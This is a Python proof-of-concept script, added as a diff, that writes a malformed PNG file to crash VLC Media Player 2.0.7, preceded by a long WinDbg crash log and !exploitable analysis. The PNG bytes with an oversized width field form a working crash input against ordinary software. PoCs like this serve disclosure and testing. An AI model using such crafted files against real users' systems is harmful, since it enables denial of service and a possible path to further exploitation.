@@ -1,0 +1,217 @@
+#!/usr/bin/python
+
+# VLC Media Player 2.0.7 PNG Crash PoC
+# Vendor Homepage: http://www.videolan.org/
+# Version: 2.0.7
+# Tested on: Windows 7 64-bit
+# Author: Kevin Fujimoto
+
+# Debug Information:
+# Microsoft (R) Windows Debugger Version 6.12.0002.633 X86
+# Copyright (c) Microsoft Corporation. All rights reserved.
+
+# *** wait with pending attach
+# Symbol search path is: SRV*g:\symbols*http://msdl.microsoft.com/download/symbols
+# Executable search path is: 
+# ModLoad: 00400000 00425000   G:\Program Files (x86)\VideoLAN\VLC\vlc.exe
+# ModLoad: 775b0000 77730000   C:\Windows\SysWOW64\ntdll.dll
+# ModLoad: 750f0000 75200000   C:\Windows\syswow64\kernel32.dll
+# ModLoad: 76100000 76147000   C:\Windows\syswow64\KERNELBASE.dll
+# ModLoad: 623e0000 6240c000   G:\Program Files (x86)\VideoLAN\VLC\libvlc.dll
+# ModLoad: 50420000 5066d000   G:\Program Files (x86)\VideoLAN\VLC\libvlccore.dll
+# ModLoad: 75ab0000 75b50000   C:\Windows\syswow64\ADVAPI32.dll
+# ModLoad: 76170000 7621c000   C:\Windows\syswow64\msvcrt.dll
+# ModLoad: 76150000 76169000   C:\Windows\SysWOW64\sechost.dll
+# ModLoad: 75210000 75300000   C:\Windows\syswow64\RPCRT4.dll
+# ModLoad: 75000000 75060000   C:\Windows\syswow64\SspiCli.dll
+# ModLoad: 74ff0000 74ffc000   C:\Windows\syswow64\CRYPTBASE.dll
+# ModLoad: 76390000 76fda000   C:\Windows\syswow64\SHELL32.DLL
+# ModLoad: 76230000 76287000   C:\Windows\syswow64\SHLWAPI.dll
+# ModLoad: 75dd0000 75e60000   C:\Windows\syswow64\GDI32.dll
+# ModLoad: 75ca0000 75da0000   C:\Windows\syswow64\USER32.dll
+# ModLoad: 760f0000 760fa000   C:\Windows\syswow64\LPK.dll
+# ModLoad: 75bf0000 75c8d000   C:\Windows\syswow64\USP10.dll
+# ModLoad: 71880000 718b2000   C:\Windows\system32\WINMM.DLL
+# ModLoad: 75590000 755c5000   C:\Windows\syswow64\WS2_32.dll
+# ModLoad: 75300000 75306000   C:\Windows\syswow64\NSI.dll
+# ModLoad: 75730000 75735000   C:\Windows\syswow64\PSAPI.DLL
+# ModLoad: 75750000 75908000   C:\Windows\syswow64\WININET.DLL
+# ModLoad: 75be0000 75be4000   C:\Windows\syswow64\api-ms-win-downlevel-user32-l1-1-0.dll
+# ModLoad: 77580000 77585000   C:\Windows\syswow64\api-ms-win-downlevel-advapi32-l1-1-0.dll
+# ModLoad: 76220000 76224000   C:\Windows\syswow64\api-ms-win-downlevel-shlwapi-l1-1-0.dll
+# ModLoad: 75c90000 75c94000   C:\Windows\syswow64\api-ms-win-downlevel-version-l1-1-0.dll
+# ModLoad: 74df0000 74df9000   C:\Windows\system32\version.DLL
+# ModLoad: 75a40000 75a43000   C:\Windows\syswow64\api-ms-win-downlevel-normaliz-l1-1-0.dll
+# ModLoad: 75740000 75743000   C:\Windows\syswow64\normaliz.DLL
+# ModLoad: 75310000 75508000   C:\Windows\syswow64\iertutil.dll
+# ModLoad: 75a50000 75ab0000   C:\Windows\system32\IMM32.DLL
+# ModLoad: 762c0000 7638c000   C:\Windows\syswow64\MSCTF.dll
+# ModLoad: 10000000 10059000   C:\Windows\SysWOW64\guard32.dll
+# ModLoad: 74de0000 74de7000   C:\Windows\system32\fltlib.dll
+# ModLoad: 755d0000 7572c000   C:\Windows\syswow64\ole32.dll
+# ModLoad: 73d90000 73d9b000   C:\Windows\system32\profapi.dll
+# ModLoad: 720f0000 72170000   C:\Windows\system32\uxtheme.dll
+# ModLoad: 73cb0000 73cc3000   C:\Windows\system32\dwmapi.dll
+# ModLoad: 71f50000 720ee000   C:\Windows\WinSxS\x86_microsoft.windows.common-controls_6595b64144ccf1df_6.0.7601.17514_none_41e6975e2bd6f2b2\comctl32.dll
+# ModLoad: 75060000 750e3000   C:\Windows\syswow64\CLBCatQ.DLL
+# ModLoad: 75b50000 75bdf000   C:\Windows\syswow64\OLEAUT32.dll
+# ModLoad: 61070000 610bc000   G:\Program Files (x86)\VideoLAN\VLC\plugins\access\libdshow_plugin.dll
+# ModLoad: 5bf20000 5bf3c000   G:\Program Files (x86)\VideoLAN\VLC\plugins\audio_output\libaout_directx_plugin.dll
+# ModLoad: 5bf00000 5bf1d000   G:\Program Files (x86)\VideoLAN\VLC\plugins\audio_output\libwaveout_plugin.dll
+# ModLoad: 5b850000 5b874000   G:\Program Files (x86)\VideoLAN\VLC\plugins\video_output\libdirectx_plugin.dll
+# ModLoad: 5b830000 5b849000   G:\Program Files (x86)\VideoLAN\VLC\plugins\mmxext\libmemcpymmxext_plugin.dll
+# ModLoad: 5b7f0000 5b82f000   G:\Program Files (x86)\VideoLAN\VLC\plugins\access\liblibbluray_plugin.dll
+# ModLoad: 59020000 59048000   G:\Program Files (x86)\VideoLAN\VLC\plugins\access\libaccess_bd_plugin.dll
+# ModLoad: 57fb0000 58001000   G:\Program Files (x86)\VideoLAN\VLC\plugins\access\libdvdnav_plugin.dll
+# ModLoad: 5b7d0000 5b7eb000   G:\Program Files (x86)\VideoLAN\VLC\plugins\access\libaccess_vdr_plugin.dll
+# ModLoad: 5b760000 5b77b000   G:\Program Files (x86)\VideoLAN\VLC\plugins\access\libfilesystem_plugin.dll
+# ModLoad: 50830000 508ac000   G:\Program Files (x86)\VideoLAN\VLC\plugins\stream_filter\libstream_filter_httplive_plugin.dll
+# ModLoad: 50370000 50420000   G:\Program Files (x86)\VideoLAN\VLC\plugins\stream_filter\libstream_filter_dash_plugin.dll
+# ModLoad: 59060000 5907a000   G:\Program Files (x86)\VideoLAN\VLC\plugins\access\libstream_filter_rar_plugin.dll
+# ModLoad: 58040000 58065000   G:\Program Files (x86)\VideoLAN\VLC\plugins\access\libzip_plugin.dll
+# ModLoad: 58020000 58039000   G:\Program Files (x86)\VideoLAN\VLC\plugins\stream_filter\libstream_filter_record_plugin.dll
+# ModLoad: 57bb0000 57bda000   G:\Program Files (x86)\VideoLAN\VLC\plugins\demux\libplaylist_plugin.dll
+# ModLoad: 50210000 5036f000   G:\Program Files (x86)\VideoLAN\VLC\plugins\meta_engine\libtaglib_plugin.dll
+# ModLoad: 57b50000 57baa000   G:\Program Files (x86)\VideoLAN\VLC\plugins\lua\liblua_plugin.dll
+# ModLoad: 500c0000 50202000   G:\Program Files (x86)\VideoLAN\VLC\plugins\misc\libxml_plugin.dll
+# ModLoad: 57cd0000 57ced000   G:\Program Files (x86)\VideoLAN\VLC\plugins\control\libhotkeys_plugin.dll
+# ModLoad: 57970000 57989000   G:\Program Files (x86)\VideoLAN\VLC\plugins\control\libglobalhotkeys_plugin.dll
+# ModLoad: 68cf0000 697d9000   G:\Program Files (x86)\VideoLAN\VLC\plugins\gui\libqt4_plugin.dll
+# ModLoad: 75510000 7558b000   C:\Windows\syswow64\COMDLG32.DLL
+# ModLoad: 72230000 72281000   C:\Windows\system32\WINSPOOL.DRV
+# ModLoad: 72330000 72337000   C:\Windows\system32\WSOCK32.DLL
+# ModLoad: 73da0000 73db7000   C:\Windows\system32\userenv.dll
+# ModLoad: 72200000 72216000   C:\Windows\system32\CRYPTSP.dll
+# ModLoad: 72180000 721bb000   C:\Windows\system32\rsaenh.dll
+# ModLoad: 73a60000 73a6e000   C:\Windows\system32\RpcRtRemote.dll
+# ModLoad: 507d0000 50828000   G:\Program Files (x86)\VideoLAN\VLC\plugins\services_discovery\libupnp_plugin.dll
+# ModLoad: 72650000 7266c000   C:\Windows\system32\IPHLPAPI.DLL
+# ModLoad: 72640000 72647000   C:\Windows\system32\WINNSI.DLL
+# ModLoad: 57940000 57965000   G:\Program Files (x86)\VideoLAN\VLC\plugins\services_discovery\libsap_plugin.dll
+# ModLoad: 57160000 5717a000   G:\Program Files (x86)\VideoLAN\VLC\plugins\services_discovery\libpodcast_plugin.dll
+# ModLoad: 56d90000 56daa000   G:\Program Files (x86)\VideoLAN\VLC\plugins\services_discovery\libmediadirs_plugin.dll
+# ModLoad: 507b0000 507c9000   G:\Program Files (x86)\VideoLAN\VLC\plugins\services_discovery\libwindrive_plugin.dll
+# ModLoad: 62da0000 62f0f000   C:\Windows\system32\explorerframe.dll
+# ModLoad: 62d70000 62d9f000   C:\Windows\system32\DUser.dll
+# ModLoad: 62cb0000 62d62000   C:\Windows\system32\DUI70.dll
+# ModLoad: 730c0000 73144000   C:\Windows\WinSxS\x86_microsoft.windows.common-controls_6595b64144ccf1df_5.82.7601.17514_none_ec83dffa859149af\comctl32.dll
+# ModLoad: 77c00000 77c40000   G:\Program Files (x86)\VideoLAN\VLC\plugins\demux\libmp4_plugin.dll
+# ModLoad: 77bd0000 77bf5000   G:\Program Files (x86)\VideoLAN\VLC\plugins\demux\libavi_plugin.dll
+# ModLoad: 77ba0000 77bc2000   G:\Program Files (x86)\VideoLAN\VLC\plugins\demux\libasf_plugin.dll
+# ModLoad: 77b80000 77b9b000   G:\Program Files (x86)\VideoLAN\VLC\plugins\demux\libflacsys_plugin.dll
+# ModLoad: 50790000 507ab000   G:\Program Files (x86)\VideoLAN\VLC\plugins\demux\libes_plugin.dll
+# ModLoad: 69830000 69857000   G:\Program Files (x86)\VideoLAN\VLC\plugins\demux\libmpc_plugin.dll
+# ModLoad: 61c90000 61cab000   G:\Program Files (x86)\VideoLAN\VLC\plugins\demux\libnuv_plugin.dll
+# ModLoad: 6bbb0000 6bbca000   G:\Program Files (x86)\VideoLAN\VLC\plugins\demux\libtta_plugin.dll
+# ModLoad: 675f0000 6760b000   G:\Program Files (x86)\VideoLAN\VLC\plugins\demux\libwav_plugin.dll
+# ModLoad: 6aaf0000 6abdb000   G:\Program Files (x86)\VideoLAN\VLC\plugins\demux\libsid_plugin.dll
+# ModLoad: 69d90000 69eb8000   G:\Program Files (x86)\VideoLAN\VLC\plugins\demux\libmkv_plugin.dll
+# ModLoad: 6ccd0000 6cd86000   G:\Program Files (x86)\VideoLAN\VLC\plugins\demux\liblive555_plugin.dll
+# ModLoad: 6ef10000 6ef3b000   G:\Program Files (x86)\VideoLAN\VLC\plugins\demux\libogg_plugin.dll
+# ModLoad: 70950000 70969000   G:\Program Files (x86)\VideoLAN\VLC\plugins\demux\libdirac_plugin.dll
+# ModLoad: 644f0000 6450a000   G:\Program Files (x86)\VideoLAN\VLC\plugins\demux\libsmf_plugin.dll
+# ModLoad: 64370000 6438a000   G:\Program Files (x86)\VideoLAN\VLC\plugins\demux\librawvid_plugin.dll
+# ModLoad: 6c2c0000 6c2da000   G:\Program Files (x86)\VideoLAN\VLC\plugins\demux\libpva_plugin.dll
+# ModLoad: 6a510000 6a53f000   G:\Program Files (x86)\VideoLAN\VLC\plugins\demux\libts_plugin.dll
+# ModLoad: 67f30000 67f4a000   G:\Program Files (x86)\VideoLAN\VLC\plugins\demux\libnsv_plugin.dll
+# ModLoad: 6f980000 6f999000   G:\Program Files (x86)\VideoLAN\VLC\plugins\demux\libau_plugin.dll
+# ModLoad: 6a6e0000 6a74f000   G:\Program Files (x86)\VideoLAN\VLC\plugins\demux\libgme_plugin.dll
+# ModLoad: 6c5e0000 6c5fa000   G:\Program Files (x86)\VideoLAN\VLC\plugins\demux\libvoc_plugin.dll
+# ModLoad: 64810000 64829000   G:\Program Files (x86)\VideoLAN\VLC\plugins\demux\libxa_plugin.dll
+# ModLoad: 071a0000 072ad000   G:\Program Files (x86)\VideoLAN\VLC\plugins\demux\libmod_plugin.dll
+# ModLoad: 66c10000 66c2a000   G:\Program Files (x86)\VideoLAN\VLC\plugins\demux\libaiff_plugin.dll
+# ModLoad: 060b0000 060cb000   G:\Program Files (x86)\VideoLAN\VLC\plugins\demux\libimage_plugin.dll
+# ModLoad: 77b40000 77b7e000   G:\Program Files (x86)\VideoLAN\VLC\plugins\codec\libpng_plugin.dll
+# (1e8c.1954): Access violation - code c0000005 (!!! second chance !!!)
+# eax=072b0048 ebx=00ab0000 ecx=00000000 edx=00000000 esi=072b0040 edi=00ab0000
+# eip=775eb6d8 esp=0658daf4 ebp=0658dbc4 iopl=0         nv up ei pl nz na po nc
+# cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00010202
+# ntdll!RtlpAllocateHeap+0x7fb:
+# 775eb6d8 8b09            mov     ecx,dword ptr [ecx]  ds:002b:00000000=????????
+# 0:009> !exploitable -v
+# HostMachine\HostUser
+# Executing Processor Architecture is x86
+# Debuggee is in User Mode
+# Debuggee is a live user mode debugging session on the local machine
+# Event Type: Exception
+# *** ERROR: Module load completed but symbols could not be loaded for G:\Program Files (x86)\VideoLAN\VLC\vlc.exe
+# Exception Faulting Address: 0x0
+# Second Chance Exception Type: STATUS_ACCESS_VIOLATION (0xC0000005)
+# Exception Sub-Type: Read Access Violation
+
+# Faulting Instruction:775eb6d8 mov ecx,dword ptr [ecx]
+
+# Basic Block:
+#     775eb6d8 mov ecx,dword ptr [ecx]
+#        Tainted Input Operands: ecx
+#     775eb6da mov edx,dword ptr [edx+4]
+#     775eb6dd cmp ecx,edx
+#        Tainted Input Operands: ecx
+#     775eb6df jne ntdll!rtlpallocateheap+0x8e4 (7763af86)
+#        Tainted Input Operands: ZeroFlag
+
+# Exception Hash (Major/Minor): 0x65193219.0x71557302
+
+# Stack Trace:
+# ntdll!RtlpAllocateHeap+0x7fb
+# ntdll!RtlAllocateHeap+0x23a
+# msvcrt!_calloc_impl+0x136
+# msvcrt!_calloc_crt+0x16
+# msvcrt!_getbuf+0x11
+# msvcrt!_flsbuf+0x94
+# msvcrt!_fputwc_nolock+0xd5
+# msvcrt!fputwc+0x51
+# vlc+0x5975
+# vlc+0x97ee
+# vlc+0x700b
+# msvcrt!_wsopen_s+0x1b
+# msvcrt!_unlock+0x15
+# msvcrt!_iob+0x60
+# ntdll!ExecuteHandler2+0x26
+# Instruction Address: 0x00000000775eb6d8
+
+# Description: Data from Faulting Address controls Branch Selection
+# Short Description: TaintedDataControlsBranchSelection
+# Exploitability Classification: UNKNOWN
+# Recommended Bug Title: Data from Faulting Address controls Branch Selection starting at ntdll!RtlpAllocateHeap+0x00000000000007fb called from msvcrt!_calloc_impl+0x0000000000000136 (Hash=0x65193219.0x71557302)
+
+# The data from the faulting address is later used to determine whether or not a branch is taken.
+
+out = (
+       "\x89\x50\x4E\x47\x0D\x0A\x1A\x0A" # PNG signature
+       "\x00\x00\x00\x0D" # IHDR size
+       "\x49\x48\x44\x52" # IHDR chunk
+       "\x7F\xFF\xFF\xFF" # width
+       "\x00\x00\x01\x02" # height
+       "\x01" # bit depth 
+       "\x03" # color type
+       "\x00" # compression method
+       "\x00" # filter method
+       "\x00" # interlace method
+       "\xBA\x1B\xD8\x84" # IHDR chunk CRC
+       "\x00\x00\x00\x03" # PLTE size
+	   "\x50\x4C\x54\x45" # PLTE chunk
+	   "\xFF" # red
+	   "\xFF" # green
+       "\xFF" # blue
+	   "\xA7\xC4\x1B\xC8" # PLTE chunk CRC
+	   "\x00\x00\x00\x01" # tRNS size
+	   "\x74\x52\x4E\x53" # tRNS chunk
+	   "\x00" # alpha
+	   "\x40\xE6\xD8\x66" # tRNS chunk CRC
+	   "\x00\x00\x00\x01" # IDAT size
+	   "\x49\x44\x41\x54" # IDAT chunk
+	   "\xFF" # image data
+	   "\x05\x3A\x92\x65" # IDAT chunk CRC 
+	   "\x00\x00\x00\x00" # IEND size
+	   "\x49\x45\x4E\x44" # IEND chunk
+	   "\xAE\x42\x60\x82" # IEND chunk CRC
+	   )
+
+print "Writing file..."
+
+file = open('crash.png', 'wb')
+file.write(out)
+file.close()
+
+print "File written!"
